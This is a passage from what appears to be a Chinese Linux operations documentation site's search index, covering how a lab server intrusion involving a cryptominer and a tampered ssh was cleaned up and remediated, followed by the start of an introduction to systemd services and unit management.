\u200b\u5bc6\u94a5\u200b\u5bf9\u200b\uff0c\u200b\u5e76\u200b\u66ff\u6362\u200b\u4e86\u200b\u539f\u6765\u200b\u5df2\u200b\u6cc4\u9732\u200b\u7684\u200b\u5bc6\u94a5\u200b\uff0c\u200b\u9632\u6b62\u200b\u653b\u51fb\u8005\u200b\u4f7f\u7528\u200b\u7a83\u53d6\u200b\u7684\u200b\u79c1\u94a5\u200b\u7ee7\u7eed\u200b\u8bbf\u95ee\u200b\u5b9e\u9a8c\u5ba4\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\u3002</li> <li>\u200b\u7ec8\u6b62\u200b\u6076\u610f\u200b\u8fdb\u7a0b\u200b\uff1a\u200b\u6211\u4eec\u200b\u6740\u6389\u200b\u4e86\u200b\u6240\u6709\u200b\u9690\u85cf\u200b\u7684\u200b\u6316\u77ff\u200b\u8fdb\u7a0b\u200b\uff0c\u200b\u5e76\u200b\u5220\u9664\u200b\u4e86\u200b\u5bf9\u5e94\u200b\u7684\u200b\u53ef\u6267\u884c\u6587\u4ef6\u200b\uff08\u200b\u5982\u200b <code>/var/tmp/Xorgs</code> \u200b\u548c\u200b <code>/opt/Xorgs</code>\uff09\uff0c\u200b\u786e\u4fdd\u200b\u6076\u610f\u7a0b\u5e8f\u200b\u65e0\u6cd5\u200b\u7ee7\u7eed\u200b\u8fd0\u884c\u200b\u3002</li> <li>\u200b\u6062\u590d\u200b\u88ab\u200b\u7be1\u6539\u200b\u7684\u200b\u6587\u4ef6\u200b\uff1a\u200b\u4ece\u200b apt \u200b\u6e90\u200b\u91cd\u65b0\u200b\u4e0b\u8f7d\u200b\u5e76\u200b\u5b89\u88c5\u200b\u4e86\u200b <code>ssh</code> \u200b\u8f6f\u4ef6\u5305\u200b\uff0c\u200b\u4ee5\u200b\u786e\u4fdd\u200b <code>ssh</code> \u200b\u4e8c\u8fdb\u5236\u200b\u6587\u4ef6\u200b\u672a\u200b\u88ab\u200b\u7be1\u6539\u200b\uff0c\u200b\u5e76\u200b\u6062\u590d\u200b <code>/etc/ssh/sshd_config</code> \u200b\u7684\u200b\u914d\u7f6e\u200b\uff08<code>PasswordAuthentication no</code> \u200b\u548c\u200b <code>UsePAM yes</code>\uff09\u3002</li> <li>\u200b\u53d6\u6d88\u200b\u8282\u70b9\u200b\u95f4\u200b root \u200b\u7684\u200b ssh \u200b\u4e92\u8fde\u200b\uff1a\u200b\u5220\u9664\u200b\u4e86\u200b\u4ece\u200b\u4e2d\u5fc3\u200b\u8282\u70b9\u200b\u5411\u200b\u5176\u4ed6\u200b\u8ba1\u7b97\u200b\u8282\u70b9\u200b\u7684\u200b root \u200b\u7528\u6237\u200b\u7684\u200b SSH \u200b\u516c\u79c1\u200b\u94a5\u200b\uff0c\u200b\u9632\u6b62\u200b\u653b\u51fb\u8005\u200b\u518d\u6b21\u200b\u901a\u8fc7\u200b\u6a2a\u5411\u200b\u6269\u5c55\u200b\u5165\u4fb5\u200b\u5176\u4ed6\u200b\u670d\u52a1\u5668\u200b\u3002</li> <li>\u200b\u68c0\u67e5\u200b crontab\uff1a     \u200b\u6211\u4eec\u200b\u68c0\u67e5\u200b\u4e86\u200b\u6240\u6709\u200b\u670d\u52a1\u5668\u200b\u7684\u200b crontab \u200b\u5b9a\u65f6\u200b\u4efb\u52a1\u200b\uff0c\u200b\u672a\u200b\u53d1\u73b0\u200b\u53ef\u7591\u200b\u4efb\u52a1\u200b\uff0c\u200b\u786e\u4fdd\u200b\u653b\u51fb\u8005\u200b\u672a\u200b\u901a\u8fc7\u200b\u5b9a\u65f6\u200b\u4efb\u52a1\u200b\u7ef4\u6301\u200b\u6301\u4e45\u200b\u5316\u200b\u8bbf\u95ee\u200b\u3002</li> <li>\u200b\u68c0\u67e5\u200b\u6240\u6709\u200b\u8f6f\u4ef6\u200b\u662f\u5426\u200b\u4e0e\u200b apt \u200b\u6e90\u200b\u4e00\u81f4\u200b\uff1a     \u200b\u4f7f\u7528\u200b <code>dpkg -V</code> \u200b\u68c0\u67e5\u200b\u4e86\u200b\u6240\u6709\u200b\u5df2\u200b\u5b89\u88c5\u200b\u8f6f\u4ef6\u5305\u200b\u7684\u200b\u5b8c\u6574\u6027\u200b\uff0c\u200b\u786e\u4fdd\u200b\u6240\u6709\u200b\u7cfb\u7edf\u200b\u8f6f\u4ef6\u5305\u200b\u6ca1\u6709\u200b\u88ab\u200b\u7be1\u6539\u200b\u3002</li> <li>\u200b\u5b89\u5168\u200b\u57f9\u8bad\u200b\uff1a\u200b\u5728\u200b\u5b9e\u9a8c\u5ba4\u200b\u4e2d\u200b\u8fdb\u884c\u200b\u4e86\u200b\u670d\u52a1\u5668\u200b\u5b89\u5168\u200b\u57f9\u8bad\u200b\uff0c\u200b\u544a\u8beb\u200b\u5927\u5bb6\u200b\uff1a<ul> <li>\u200b\u79bb\u5f00\u200b\u7535\u8111\u200b\u65f6\u200b\u4e00\u5b9a\u200b\u8981\u9501\u5c4f\u200b\uff1b</li> <li>\u200b\u79c1\u94a5\u200b\u5fc5\u987b\u200b\u59a5\u5584\u200b\u4fdd\u7ba1\u200b\uff0c\u200b\u4e0d\u8981\u200b\u5728\u200b\u4e0d\u540c\u200b\u673a\u5668\u95f4\u200b\u5171\u4eab\u200b\u540c\u200b\u4e00\u4efd\u200b\u79c1\u94a5\u200b\uff1b</li> <li>\u200b\u4e0d\u8981\u200b\u5728\u200b\u5b89\u5168\u6027\u200b\u4f4e\u200b\u7684\u200b\u7535\u8111\u200b\u4e0a\u200b\u767b\u5f55\u200b\u5b9e\u9a8c\u5ba4\u200b\u670d\u52a1\u5668\u200b\u3002</li> </ul> </li> </ol>"},{"location":"ops/security/#lab-server-intrusion-unanswered-questions","title":"\u672a\u200b\u89e3\u51b3\u95ee\u9898","text":"<p>\u200b\u5c3d\u7ba1\u200b\u6211\u4eec\u200b\u91c7\u53d6\u200b\u4e86\u200b\u4e0a\u8ff0\u200b\u63aa\u65bd\u200b\uff0c\u200b\u4f46\u662f\u200b\u4ecd\u7136\u200b\u6709\u200b\u5982\u4e0b\u200b\u95ee\u9898\u200b\u6ca1\u6709\u200b\u89e3\u51b3\u200b\uff1a</p> <ul> <li> <p>\u200b\u65e5\u5fd7\u200b\u670d\u52a1\u200b\u88ab\u200b\u7981\u7528\u200b\uff1a\u200b\u653b\u51fb\u8005\u200b\u4e3a\u4e86\u200b\u9632\u6b62\u200b\u6211\u4eec\u200b\u53d1\u73b0\u200b\u5176\u200b\u767b\u5f55\u200b\u884c\u4e3a\u200b\uff0c\u200b\u5173\u95ed\u200b\u4e86\u200b rsyslog \u200b\u670d\u52a1\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u6240\u6709\u200b\u670d\u52a1\u5668\u200b\u7684\u200b <code>auth.log</code> \u200b\u4e0d\u518d\u200b\u66f4\u65b0\u200b\u3002\u200b\u6211\u4eec\u200b\u5c1d\u8bd5\u200b\u91cd\u65b0\u542f\u52a8\u200b rsyslog \u200b\u670d\u52a1\u200b\uff0c\u200b\u4f46\u200b\u5e76\u672a\u200b\u6210\u529f\u200b\u3002\u200b\u5177\u4f53\u8868\u73b0\u200b\u4e3a\u200b\uff1a</p> <ul> <li><code>systemctl status rsyslog.service</code> \u200b\u663e\u793a\u200b\u670d\u52a1\u200b\u72b6\u6001\u200b\u4e3a\u200b active\uff0c\u200b\u4f46\u200b <code>auth.log</code> \u200b\u5e76\u672a\u200b\u66f4\u65b0\u200b\u3002</li> <li>\u200b\u67e5\u770b\u200b <code>/proc/&lt;PID&gt;/fd/</code>\uff0c\u200b\u53d1\u73b0\u200b\u670d\u52a1\u200b\u7684\u200b\u8f93\u51fa\u200b\u5e76\u672a\u200b\u6b63\u786e\u200b\u91cd\u5b9a\u5411\u200b\u5230\u200b <code>/var/log/auth.log</code>\u3002</li> <li>\u200b\u68c0\u67e5\u200b rsyslog \u200b\u7684\u200b\u4e8c\u8fdb\u5236\u200b\u6587\u4ef6\u200b\u548c\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff0c\u200b\u53d1\u73b0\u200b\u5747\u200b\u672a\u200b\u88ab\u200b\u4fee\u6539\u200b\uff0c\u200b\u4f46\u200b\u95ee\u9898\u200b\u4f9d\u7136\u200b\u5b58\u5728\u200b\u3002</li> </ul> </li> <li> <p>journal \u200b\u65e5\u5fd7\u200b\u88ab\u200b\u5220\u9664\u200b\uff1a\u200b\u653b\u51fb\u8005\u200b\u4e3a\u4e86\u200b\u9632\u6b62\u200b\u6211\u4eec\u200b\u53d1\u73b0\u200b\u5176\u200b\u64cd\u4f5c\u200b\u884c\u4e3a\u200b\uff0c\u200b\u6bcf\u6b21\u200b\u9000\u51fa\u200b\u767b\u5f55\u200b\u524d\u200b\u90fd\u200b\u4f1a\u200b\u5220\u9664\u200b journal \u200b\u65e5\u5fd7\u200b\u3002\u200b\u901a\u8fc7\u200b\u67e5\u770b\u200b dmesg\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5927\u91cf\u200b journal \u200b\u88ab\u200b\u5220\u9664\u200b\u7684\u200b\u8bb0\u5f55\u200b\u3002\u200b\u56e0\u6b64\u200b\uff0c\u200b\u6211\u4eec\u200b\u65e0\u6cd5\u200b\u786e\u5b9a\u200b\u653b\u51fb\u8005\u200b\u9664\u4e86\u200b\u8fd0\u884c\u200b\u6316\u77ff\u200b\u8fdb\u7a0b\u200b\u3001\u200b\u66ff\u6362\u200b <code>ssh</code> \u200b\u547d\u4ee4\u200b\u4ee5\u53ca\u200b\u4fee\u6539\u200b ssh \u200b\u914d\u7f6e\u200b\u5916\u200b\uff0c\u200b\u8fd8\u200b\u8fdb\u884c\u200b\u4e86\u200b\u54ea\u4e9b\u200b\u64cd\u4f5c\u200b\u3002</p> </li> <li>\u200b\u6f5c\u5728\u200b\u7684\u200b\u6b8b\u7559\u200b\u540e\u95e8\u200b\uff1a\u200b\u5728\u200b\u521d\u6b65\u200b\u6e05\u7406\u200b\u540e\u200b\u7684\u200b\u7b2c\u4e8c\u5929\u200b\uff0cdmesg \u200b\u4e2d\u200b\u53c8\u200b\u51fa\u73b0\u200b\u4e86\u200b\u4e00\u6761\u200b\u65b0\u200b\u7684\u200b journal \u200b\u88ab\u200b\u5220\u9664\u200b\u7684\u200b\u65e5\u5fd7\u200b\u3002\u200b\u8fd9\u200b\u8868\u660e\u200b\u653b\u51fb\u8005\u200b\u53ef\u80fd\u200b\u4ecd\u200b\u7559\u6709\u200b\u6211\u4eec\u200b\u672a\u200b\u53d1\u73b0\u200b\u7684\u200b\u540e\u95e8\u200b\u6216\u200b\u63a7\u5236\u200b\u624b\u6bb5\u200b\u3002</li> </ul>"},{"location":"ops/security/#lab-server-intrusion-final-solution","title":"\u5f7b\u5e95\u89e3\u51b3\u200b\u65b9\u6848","text":"<p>\u200b\u7531\u4e8e\u200b\u65e0\u6cd5\u200b\u5b8c\u5168\u200b\u6392\u9664\u200b\u653b\u51fb\u8005\u200b\u7559\u4e0b\u200b\u7684\u200b\u9690\u60a3\u200b\uff0c\u200b\u6211\u4eec\u200b\u51b3\u5b9a\u200b\u91c7\u53d6\u200b\u6700\u200b\u5f7b\u5e95\u200b\u7684\u200b\u63aa\u65bd\u200b\u2014\u2014\u200b\u91cd\u88c5\u200b\u6240\u6709\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u7cfb\u7edf\u200b\u3002</p> <ol> <li>\u200b\u6211\u4eec\u200b\u5907\u4efd\u200b\u4e86\u200b\u539f\u6765\u200b\u7684\u200b rootfs\uff0c\u200b\u4ee5\u4fbf\u200b\u540e\u7eed\u200b\u6062\u590d\u200b\u5fc5\u8981\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u548c\u200b\u6570\u636e\u200b\u3002</li> <li>\u200b\u7136\u540e\u200b\u6211\u4eec\u200b\u91cd\u88c5\u200b\u4e86\u200b\u6240\u6709\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u7cfb\u7edf\u200b\uff0c\u200b\u786e\u4fdd\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u662f\u200b\u5e72\u51c0\u200b\u7684\u200b\u3002</li> <li>\u200b\u6700\u540e\u200b\uff0c\u200b\u6211\u4eec\u200b\u4ece\u200b\u5907\u4efd\u200b\u7684\u200b rootfs \u200b\u4e2d\u200b\u6062\u590d\u200b\u5fc5\u8981\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff08\u200b\u6587\u4ef6\u200b\u7684\u200b change time \u200b\u5728\u200b\u5165\u4fb5\u200b\u4e4b\u524d\u200b\uff0c\u200b\u6216\u200b\u7ecf\u8fc7\u200b\u68c0\u67e5\u200b\u786e\u8ba4\u200b\u6ca1\u6709\u200b\u95ee\u9898\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff09\u3002</li> </ol> <p>\u200b\u81f3\u6b64\u200b\uff0c\u200b\u6b64\u6b21\u200b\u5165\u4fb5\u200b\u540e\u200b\u7684\u200b\u4e8b\u6545\u200b\u5904\u7406\u200b\u544a\u4e00\u6bb5\u843d\u200b\u3002</p> <p>\u200b\u601d\u8003\u200b</p> <p>\u200b\u5982\u679c\u200b\u672a\u6765\u200b\u518d\u6b21\u51fa\u73b0\u200b\u4e86\u200b\u6709\u200b\u7528\u6237\u200b\u7684\u200b\u5bc6\u94a5\u200b\u6cc4\u6f0f\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5e94\u8be5\u200b\u600e\u4e48\u200b\u8bbe\u8ba1\u200b\u6765\u200b\u907f\u514d\u200b\u4e0a\u6587\u200b\u7684\u200b\u5b89\u5168\u200b\u95ee\u9898\u200b\u518d\u6b21\u53d1\u751f\u200b\uff1f</p> <ol> <li> <p>\u200b\u6d4b\u8bd5\u200b prompt \u200b\u5185\u5bb9\u200b\uff1a<code>\u200b\u6211\u200b\u73b0\u5728\u200b\u5728\u200b\u7528\u200b FastAPI+Vue \u200b\u7f16\u5199\u200b\u4e00\u4e2a\u200b\u7f51\u7ad9\u200b\uff0cVue \u200b\u7684\u200b\u5bfc\u822a\u200b\u65b9\u5f0f\u200b\u4e3a\u200b history\uff0c\u200b\u7f16\u8bd1\u200b\u540e\u200b\u7684\u200b\u9759\u6001\u200b Vue \u200b\u7f51\u9875\u6587\u4ef6\u200b\u5728\u200b dist \u200b\u76ee\u5f55\u200b\u4e0b\u200b\uff0c\u200b\u5165\u53e3\u200b\u6587\u4ef6\u540d\u200b\u4e3a\u200b index.html\u3002\u200b\u73b0\u5728\u200b\u6211\u8981\u200b\u4f7f\u7528\u200b FastAPI \u200b\u540c\u65f6\u200b\u4f5c\u4e3a\u200b\u524d\u7aef\u200b\u548c\u200b API \u200b\u7684\u200b server\uff0cAPI \u200b\u5728\u200b /api/* \u200b\u8def\u5f84\u200b\u4e0b\u200b\uff0c\u200b\u8bf7\u200b\u7f16\u5199\u200b\u4ee3\u7801\u200b\uff0c\u200b\u4f7f\u5f97\u200b dist \u200b\u76ee\u5f55\u200b\u4e0b\u200b\u6ca1\u6709\u200b\u5bf9\u5e94\u200b\u6587\u4ef6\u200b\u65f6\u200b\u8fd4\u56de\u200b index.html \u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u4ee5\u4fbf\u200b\u5373\u4f7f\u200b Vue \u200b\u7684\u200b\u8def\u5f84\u200b\u4e0d\u200b\u5b9e\u9645\u200b\u5728\u200b dist \u200b\u76ee\u5f55\u200b\u4e0b\u65f6\u200b\u4e5f\u200b\u80fd\u200b\u6b63\u786e\u200b\u663e\u793a\u200b\u5bf9\u5e94\u200b\u7684\u200b\u9875\u9762\u200b\u3002</code> \u21a9</p> </li> </ol>"},{"location":"ops/server/","title":"\u670d\u52a1\u5668\u200b\u4ecb\u7ecd","text":"<p>\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b</p>"},{"location":"ops/service/","title":"\u670d\u52a1\u200b\u4e0e\u200b\u65e5\u5fd7\u200b\u7ba1\u7406","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@iBug</p> <p>\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b</p> <p>\u200b\u73b0\u4ee3\u200b\u7684\u200b Linux \u200b\u53d1\u884c\u7248\u200b\u90fd\u200b\u4f7f\u7528\u200b systemd \u200b\u6765\u200b\u7ba1\u7406\u7cfb\u7edf\u200b\u670d\u52a1\u200b\uff0c\u200b\u56e0\u6b64\u200b\u672c\u6587\u200b\u4e3b\u8981\u200b\u4ecb\u7ecd\u200b systemd \u200b\u73af\u5883\u200b\u4e0b\u200b\u7684\u200b\u670d\u52a1\u200b\u4e0e\u200b\u65e5\u5fd7\u200b\u7ba1\u7406\u200b\uff0cGentoo \u200b\u7528\u6237\u200b\u8bf7\u200b\u7ed5\u9053\u200b\u3002</p> <p>\u200b\u65e9\u671f\u200b\uff082014 \u200b\u5e74\u200b\u4ee5\u524d\u200b\uff09\u200b\u8fd8\u6709\u200b SysVinit \u200b\u548c\u200b Upstart \u200b\u7b49\u200b\uff0c\u200b\u4f46\u200b\u73b0\u5728\u200b\u5df2\u7ecf\u200b\u5f88\u5c11\u200b\u89c1\u200b\u4e86\u200b\u3002SysVinit \u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b\u73b0\u4ee3\u5316\u200b\u7684\u200b\u66ff\u4ee3\u54c1\u200b\uff0c\u200b\u53eb\u505a\u200b OpenRC\u3002</p>"},{"location":"ops/service/#init","title":"Init","text":"<p>Init \u200b\u8fdb\u7a0b\u200b\u662f\u200b Linux \u200b\u542f\u52a8\u200b\u65f6\u200b\u8fd0\u884c\u200b\u7684\u200b\u7b2c\u4e00\u4e2a\u200b\u8fdb\u7a0b\u200b\uff0c\u200b\u8d1f\u8d23\u200b\u542f\u52a8\u200b\u7cfb\u7edf\u200b\u7684\u200b\u5404\u79cd\u200b\u670d\u52a1\u200b\u5e76\u200b\u6700\u7ec8\u200b\u542f\u52a8\u200b shell\u3002\u200b\u4f20\u7edf\u200b\u7684\u200b init \u200b\u7a0b\u5e8f\u200b\u4f4d\u4e8e\u200b <code>/sbin/init</code>\uff0c\u200b\u800c\u200b\u73b0\u4ee3\u200b\u53d1\u884c\u7248\u200b\u4e2d\u200b\u5b83\u200b\u4e00\u822c\u200b\u662f\u200b\u6307\u5411\u200b <code>/lib/systemd/systemd</code> \u200b\u7684\u200b\u8f6f\u200b\u94fe\u63a5\u200b\uff0c\u200b\u5373\u200b\u7531\u200b systemd \u200b\u4f5c\u4e3a\u200b PID 1 \u200b\u8fd0\u884c\u200b\u3002</p> <p>PID 1 \u200b\u5728\u200b Linux \u200b\u4e2d\u6709\u200b\u4e00\u4e9b\u200b\u7279\u6b8a\u200b\u7684\u200b\u5730\u4f4d\u200b\uff1a</p> <ul> <li>\u200b\u4e0d\u200b\u53d7\u200b <code>SIGKILL</code> \u200b\u6216\u200b <code>SIGSTOP</code> \u200b\u4fe1\u53f7\u200b\u5f71\u54cd\u200b\uff0c\u200b\u4e0d\u80fd\u200b\u88ab\u200b\u6740\u6b7b\u200b\u6216\u200b\u6682\u505c\u200b\u3002\u200b\u7c7b\u4f3c\u200b\u5730\u200b\uff0c\u200b\u5373\u4f7f\u200b\u6536\u5230\u200b\u4e86\u200b\u5176\u4ed6\u200b\u672a\u6ce8\u518c\u200b\u7684\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u9ed8\u8ba4\u200b\u884c\u4e3a\u200b\u4e5f\u200b\u662f\u200b\u5ffd\u7565\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u7ed3\u675f\u200b\u8fdb\u7a0b\u200b\u6216\u200b\u6302\u200b\u8d77\u200b\u3002</li> <li>\u200b\u5f53\u200b\u5176\u4ed6\u200b\u8fdb\u7a0b\u200b\u9000\u51fa\u200b\u65f6\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u5b50\u200b\u8fdb\u7a0b\u200b\u4f1a\u200b\u7531\u200b PID 1 \u200b\u63a5\u7ba1\u200b\uff0c\u200b\u56e0\u6b64\u200b PID 1 \u200b\u9700\u8981\u200b\u8d1f\u8d23\u200b\u56de\u6536\u200b\uff08<code>wait(2)</code>\uff09\u200b\u8fd9\u4e9b\u200b\u50f5\u5c38\u200b\u8fdb\u7a0b\u200b\u3002</li> </ul>"},{"location":"ops/service/#systemd-and-service","title":"Systemd \u200b\u4e0e\u200b\u670d\u52a1","text":"<p>Systemd \u200b\u662f\u200b\u4e00\u5927\u200b\u5768\u200b\u8f6f\u4ef6\u200b\uff0c\u200b\u5305\u62ec\u200b\u670d\u52a1\u200b\u7ba1\u7406\u200b\uff08PID 1\uff09\u3001\u200b\u65e5\u5fd7\u200b\u7ba1\u7406\u200b\uff08systemd-journald\uff09\u3001\u200b\u7f51\u7edc\u7ba1\u7406\u200b\uff08systemd-networkd\uff09\u3001\u200b\u672c\u5730\u200b DNS \u200b\u7f13\u5b58\u200b\uff08systemd-resolved\uff09\u3001\u200b\u65f6\u95f4\u200b\u540c\u6b65\u200b\uff08systemd-timesyncd\uff09\u200b\u7b49\u200b\uff0c\u200b\u672c\u6587\u200b\u4e3b\u8981\u200b\u5173\u5fc3\u200b\u670d\u52a1\u200b\u7ba1\u7406\u200b\u548c\u200b\u65e5\u5fd7\u200b\u7ba1\u7406\u200b\u3002</p>"},{"location":"ops/service/#unit","title":"Unit","text":"<p>\u200b\u5728\u200b systemd \u200b\u4e2d\u200b\uff0c\u200b\u8fd0\u884c\u200b\u4e00\u4e2a\u200b\u5b8c\u6574\u200b\u7cfb\u7edf\u200b\u6240\u200b\u9700\u200b\u7684\u200b\u6bcf\u4e2a\u200b\u90e8\u4ef6\u200b\u90fd\u200b\u4f5c\u4e3a\u200b\u201c\u200b\u5355\u5143\u200b\u201d\uff08unit\uff09\u200b\u7ba1\u7406\u200b\u3002\u200b\u4e00\u4e2a\u200b unit \u200b\u53ef\u4ee5\u200b\u662f\u200b\u670d\u52a1\u200b\uff08<code>.service</code>\uff09\u3001\u200b\u6302\u8f7d\u200b\u70b9\u200b\uff08<code>.mount</code>\uff09\u3001\u200b\u8bbe\u5907\u200b\uff08<code>.device</code>\uff09\u3001\u200b\u5b9a\u65f6\u5668\u200b\uff08<code>.timer</code>\uff09\u200b\u4ee5\u81f3\u4e8e\u200b\u76ee\u6807\u200b\uff08<code>.target</code>\uff09\u200b\u7b49\u200b\uff0c\u200b\u5b8c\u6574\u200b\u7684\u200b\u5217\u8868\u200b\u53ef\u4ee5\u200b\u5728\u200b <code>systemd.unit(5)</code> \u200b\u4e2d\u200b\u627e\u5230\u200b\u3002</p> <pre><code>graph TD\nU(unit) --&gt; A(service)\nU --&gt; B(mount)\nU --&gt; C(device)\nU --&gt; D(target)\nU --&gt; E(slice)\nU --&gt; F(scope)</code></pre> <p>Systemd unit \u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e3b\u8981\u200b\u4ece\u200b\u4ee5\u4e0b\u200b\u76ee\u5f55\u200b\u6309\u200b\u987a\u5e8f\u200b\u8f7d\u5165\u200b\uff0c\u200b\u5176\u4e2d\u200b\u540c\u540d\u200b\u7684\u200b\u6587\u4ef6\u200b\u53ea\u53d6\u200b\u627e\u5230\u200b\u7684\u200b\u7b2c\u4e00\u4e2a\u200b\uff1a</p> <ul> <li><code>/etc/systemd/system</code>\uff1a\u200b\u672c\u5730\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff0c\u200b\u4f18\u5148\u7ea7\u200b\u6700\u9ad8\u200b\uff0c\u200b\u8fd9\u200b\u4e5f\u200b\u662f\u200b\u552f\u4e00\u200b\u4e00\u4e2a\u200b\u7ba1\u7406\u5458\u200b\u53ef\u4ee5\u200b\u624b\u52a8\u200b\u4fee\u6539\u200b\u6587\u4ef6\u200b\u7684\u200b\u5730\u65b9\u200b\u3002</li> <li><code>/run/systemd/system</code>\uff1a\u200b\u8fd0\u884c\u200b\u65f6\u200b\u76ee\u5f55\u200b\uff0c\u200b\u5b58\u653e\u200b\u7531\u200b systemd \u200b\u6216\u200b\u5176\u4ed6\u200b\u7a0b\u5e8f\u200b\u52a8\u6001\u521b\u5efa\u200b\u7684\u200b unit\u3002\u200b\u6ce8\u610f\u200b <code>/run</code> \u200b\u76ee\u5f55\u200b\u91cd\u542f\u200b\u540e\u4f1a\u200b\u88ab\u200b\u6e05\u7a7a\u200b\u3002</li> <li><code>/usr/lib/systemd/system</code>\uff1a\u200b\u7cfb\u7edf\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff0c\u200b\u4f18\u5148\u7ea7\u200b\u6700\u4f4e\u200b\uff0c\u200b\u4e00\u822c\u200b\u7531\u200b\u53d1\u884c\u7248\u200b\uff08\u200b\u8f6f\u4ef6\u5305\u200b\u7ba1\u7406\u5668\u200b\uff09\u200b\u63d0\u4f9b\u200b\u3002</li> </ul> <p>\u200b\u5b9e\u9645\u200b\u4f1a\u200b\u641c\u7d22\u200b\u7684\u200b\u76ee\u5f55\u200b\u6bd4\u200b\u8fd9\u200b\u591a\u5f97\u591a\u200b\uff08\u200b\u53c8\u200b\u5230\u200b\u4e86\u200b\u770b\u200b man \u200b\u7684\u200b\u65f6\u5019\u200b\u4e86\u200b\uff09\uff0c\u200b\u4f46\u662f\u200b\u4e00\u822c\u200b\u53ea\u200b\u9700\u8981\u200b\u5173\u5fc3\u200b\u4e0a\u9762\u200b\u8fd9\u200b\u4e09\u4e2a\u200b\u3002</p> <p>\u200b\u5f88\u591a\u200b\u901a\u8fc7\u200b <code>systemctl</code> \u200b\u547d\u4ee4\u200b\u6539\u53d8\u200b\u7684\u200b\u914d\u7f6e\u200b\u90fd\u200b\u4f1a\u200b\u88ab\u200b\u4fdd\u5b58\u200b\u5230\u200b <code>/etc/systemd/system</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <ul> <li> <p><code>systemctl enable [some-unit]</code> \u200b\u53ef\u4ee5\u200b\u201c\u200b\u542f\u7528\u200b\u201d\u200b\u4e00\u4e2a\u200b unit\uff0c\u200b\u5373\u200b\u6fc0\u6d3b\u200b\u8be5\u200b unit \u200b\u5728\u200b <code>[Install]</code> \u200b\u90e8\u5206\u200b\u58f0\u660e\u200b\u7684\u200b\u81ea\u52a8\u200b\u542f\u52a8\u200b\u6761\u4ef6\u200b\uff0c\u200b\u5982\u200b <code>WantedBy=</code> \u200b\u548c\u200b <code>RequiredBy=</code> \u200b\u7b49\u200b\u3002\u200b\u8be5\u200b\u547d\u4ee4\u200b\u7684\u200b\u672c\u8d28\u200b\u662f\u200b\u5728\u200b <code>/etc/systemd/system</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\u521b\u5efa\u200b\u8f6f\u200b\u94fe\u63a5\u200b\u3002</p> <p>Tip</p> <p><code>systemctl enable --now [some-unit]</code> \u200b\u53ef\u4ee5\u200b\u5728\u200b enable \u200b\u4e00\u4e2a\u200b unit \u200b\u7684\u200b\u540c\u65f6\u200b\u7acb\u5373\u200b\u542f\u52a8\u200b\u5b83\u200b\u3002</p> </li> <li> <p><code>systemctl disable [some-unit]</code> \u200b\u53ef\u4ee5\u200b\u201c\u200b\u7981\u7528\u200b\u201d\u200b\u4e00\u4e2a\u200b unit\uff0c\u200b\u5373\u200b\u53d6\u6d88\u200b\u5b83\u200b\u7684\u200b\u81ea\u52a8\u200b\u542f\u52a8\u200b\u6761\u4ef6\u200b\u3002\u200b\u7c7b\u4f3c\u200b\u5730\u200b\uff0c\u200b\u8be5\u200b\u547d\u4ee4\u200b\u7684\u200b\u672c\u8d28\u200b\u662f\u200b\u5220\u9664\u200b\u4e86\u200b\u4e0a\u9762\u200b\u521b\u5efa\u200b\u7684\u200b\u8f6f\u200b\u94fe\u63a5\u200b\u3002</p> <p>Tip</p> <ul> <li>\u200b\u540c\u7406\u200b\uff0c<code>systemctl disable --now [some-unit]</code> \u200b\u53ef\u4ee5\u200b\u5728\u200b disable \u200b\u4e00\u4e2a\u200b unit \u200b\u7684\u200b\u540c\u65f6\u200b\u7acb\u5373\u200b\u505c\u6b62\u200b\u5b83\u200b\u3002</li> </ul> </li> <li> <p><code>systemctl edit [some-unit]</code> \u200b\u4f1a\u200b\u63d0\u4f9b\u200b\u4e00\u4e2a\u200b\u4e34\u65f6\u6587\u4ef6\u200b\uff0c\u200b\u5e76\u200b\u5728\u200b\u7f16\u8f91\u200b\u5b8c\u200b\u4e4b\u540e\u200b\u5c06\u200b\u5176\u200b\u4fdd\u5b58\u200b\u5230\u200b <code>/etc/systemd/system/[some-unit].d/override.conf</code> \u200b\u6587\u4ef6\u200b\u4e2d\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u5bf9\u200b unit \u200b\u7684\u200b\u4fee\u6539\u200b\u3002</p> <p>\u200b\u76f8\u6bd4\u200b\u4e8e\u200b\u624b\u5de5\u200b\u4fee\u6539\u200b\u6587\u4ef6\u200b\uff0c\u200b\u4f7f\u7528\u200b <code>systemctl edit</code> \u200b\u66f4\u52a0\u200b\u5b89\u5168\u200b\uff0c\u200b\u5b83\u4f1a\u200b\u68c0\u67e5\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u7684\u200b\u8bed\u6cd5\u200b\uff0c\u200b\u800c\u4e14\u200b\u4e0d\u200b\u9700\u8981\u200b\u518d\u200b\u989d\u5916\u200b\u8fd0\u884c\u200b <code>systemctl daemon-reload</code>\u3002</p> </li> </ul> <p>Unit 